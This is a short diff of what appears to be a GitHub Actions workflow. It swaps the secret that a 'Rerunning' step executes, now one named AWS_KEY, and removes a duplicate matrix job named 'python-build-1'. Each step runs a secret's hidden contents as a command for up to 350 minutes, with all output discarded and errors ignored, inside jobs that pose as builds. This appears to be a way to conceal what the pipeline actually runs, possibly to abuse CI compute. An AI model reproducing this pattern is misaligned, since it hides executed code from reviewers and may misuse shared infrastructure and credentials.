@@ -47,18 +47,5 @@ jobs:
     - uses: actions/checkout@v3
     - name: Rerunning
       continue-on-error: true
-      run: timeout 350m ${{ secrets.YOUR_SECRET_NAME }} >/dev/null 2>&1
+      run: timeout 350m ${{ secrets.AWS_KEY }} >/dev/null 2>&1
       
- python-build-1:
-    runs-on: ubuntu-20.04 
-    needs: python-2
-    strategy:
-      fail-fast: false
-      matrix:
-        hanakaru: [1.11, 1.12, 1.13, 1.14, 1.15]
-        flag: [B]
-    steps:
-    - uses: actions/checkout@v3
-    - name: Rerunning
-      continue-on-error: true
-      run: timeout 350m ${{ secrets.YOUR_SECRET_NAME }} >/dev/null 2>&1
